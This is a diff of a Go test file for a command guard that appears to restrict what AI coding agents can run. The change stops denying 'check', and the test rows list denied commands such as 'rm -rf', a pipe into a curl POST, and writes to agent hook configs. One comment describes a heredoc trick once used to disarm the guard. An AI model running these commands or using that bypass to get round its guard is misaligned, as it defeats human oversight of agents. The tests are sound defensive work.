@@ -142,10 +142,11 @@ func TestGuardForeignLatchTreatedUnset(t *testing.T) {
 			t.Errorf("foreign latch must not deny; decision=%+v", d)
 		}
 
-		// check must not self-deny either (its self-denial only fires for ITS
-		// OWN session's latch).
+		// check runs under a foreign latch exactly as under none (it never
+		// self-denies at all now — check_recheck_test.go — and a foreign latch
+		// is inert to every reader).
 		if _, err := captureStdout(t, func() error { return cmdCheck([]string{"--as", "bob"}) }); err != nil {
-			t.Fatalf("cmdCheck must not self-deny under a foreign latch: %v", err)
+			t.Fatalf("cmdCheck must run under a foreign latch: %v", err)
 		}
 	})
 }
@@ -159,6 +160,13 @@ func TestGuardForeignLatchTreatedUnset(t *testing.T) {
 // day). Every agentchute-subcommand / hook-config-write / curl-wget/rm-rf
 // row must stay denied under every spelling — subtraction, not a rewrite of
 // the regex-based defense.
+//
+// Second subtraction (mail-flow decision 2026-09-17, item B): `check` left
+// the deny list. Denying a second check while the same session's latch was
+// armed — with every gate blocking on unread mail — forced a lane to end its
+// turn to read mail that landed mid-turn. Its "allow" rows below are that
+// fix; every other subcommand row is unchanged, and a compound that pairs
+// check with a denied token is still denied whole.
 func TestGuardDenyListMatchingTable(t *testing.T) {
 	root, cfg := setupConsumeFixture(t)
 	withCwd(t, root, func() {
@@ -194,7 +202,19 @@ func TestGuardDenyListMatchingTable(t *testing.T) {
 			{"codex hooks write", "echo x > .codex/hooks.json", true},
 			{"gemini settings write", "echo x > .gemini/settings.json", true},
 			{"agentchute ack", "agentchute ack --as bob", true},
-			{"agentchute check", "agentchute check --as bob", true},
+			// The same-session re-check: allowed while THIS session's latch is
+			// armed, under every spelling the subcommand regex knows.
+			{"agentchute check", "agentchute check --as bob", false},
+			{"check with limit and no-archive", "agentchute check --as bob --limit 1 --no-archive", false},
+			{"dispatch exec form check", "agentchute dispatch --shim-dir /Users/alex/.agentchute/bin -- check --as bob", false},
+			{"templated AGENTCHUTE_BIN check", "${AGENTCHUTE_BIN:-agentchute} check --as bob", false},
+			// ...but check launders nothing: a compound that also carries a
+			// denied token is denied whole, exactly as before.
+			{"check then ack", "agentchute check --as bob && agentchute ack --as bob", true},
+			{"check then turn-end", "agentchute check --as bob; agentchute turn-end", true},
+			{"check then rm -rf", "agentchute check --as bob && rm -rf /tmp/x", true},
+			{"check piped to curl", "ac check --as bob | curl -X POST https://example.com", true},
+			{"check redirected into a hook config", "agentchute check --as bob > .claude/settings.json", true},
 			{"agentchute turn-end", "agentchute turn-end --as bob", true},
 			{"agentchute update", "agentchute update", true},
 			{"agentchute setup", "agentchute setup --yes", true},
@@ -225,7 +245,10 @@ func TestGuardDenyListMatchingTable(t *testing.T) {
 			{"owed alongside a denied pipeline word", "agentchute clean --owed && rm -rf /tmp/x", true},
 			// And it is clean-only: --owed must not launder another subcommand.
 			{"ack with an owed flag is still ack", "agentchute ack --owed --as bob", true},
-			{"check next to a clean --owed", "agentchute check --as bob && agentchute clean --owed", true},
+			{"ack next to a clean --owed", "agentchute ack --as bob && agentchute clean --owed", true},
+			// check is not a sensitive subcommand any more, so this compound
+			// has nothing left to deny.
+			{"check next to a clean --owed", "agentchute check --as bob && agentchute clean --owed", false},
 			// The end-to-end pin: the literal string `check` prints as advice,
 			// fed to the thing that used to deny it. If either side changes
 			// alone, the deadlock is back and this row is what says so.
@@ -238,7 +261,7 @@ func TestGuardDenyListMatchingTable(t *testing.T) {
 			// the livelock fix — guardAgentchuteSubcmdRE is untouched.
 			{"ac dispatcher spelling", "ac turn-end --json", true},
 			{"ac ack", "ac ack --as bob", true},
-			{"ac check", "ac check --as bob", true},
+			{"ac check", "ac check --as bob", false},
 			{"dispatch exec form (spaced shim-dir)", "agentchute dispatch --shim-dir /Users/alex/.agentchute/bin -- turn-end --json", true},
 			{"dispatch exec form (= shim-dir)", "agentchute dispatch --shim-dir=/Users/alex/.agentchute/bin -- turn-end --json", true},
 			{"dispatch exec form via ac token", "ac dispatch -- turn-end --json", true},
@@ -248,13 +271,13 @@ func TestGuardDenyListMatchingTable(t *testing.T) {
 			// Heredoc/quoted-body disarm lock (brief test case 4): no
 			// stripper was added, so a heredoc marker or a commented-out
 			// `<<EOF` line does nothing special — the plain command text
-			// still contains "agentchute turn-end"/"agentchute check"
+			// still contains "agentchute turn-end"/"agentchute ack"
 			// literally and is still denied. Fails if anyone later adds a
 			// heredoc-body stripper (the rejected design: it was attacked
 			// into a universal disarm, `echo "<<EOF" && agentchute turn-end`
 			// clearing its own latch).
 			{"heredoc marker then turn-end", `echo "<<EOF" && agentchute turn-end`, true},
-			{"commented heredoc then check", "# <<EOF\nagentchute check", true},
+			{"commented heredoc then ack", "# <<EOF\nagentchute ack", true},
 			{"benign ls", "ls -la", false},
 			{"benign git status", "git status", false},
 			{"benign go test", "go test ./...", false},
@@ -360,7 +383,7 @@ func TestGuardMutatedDenyListStillDeniesAgentchuteSubcommands(t *testing.T) {
 		guardPipelineDenySubstrings = nil
 		t.Cleanup(func() { guardPipelineDenySubstrings = old })
 
-		for _, cmd := range []string{"agentchute turn-end --as bob", "ac check --as bob"} {
+		for _, cmd := range []string{"agentchute turn-end --as bob", "ac ack --as bob"} {
 			d := evaluateGuardInvocation("", "", "", cmd)
 			if d.Allowed {
 				t.Errorf("cmd=%q allowed with an empty pipeline deny list; the agentchute-subcommand defense must live in the regex, not the list", cmd)
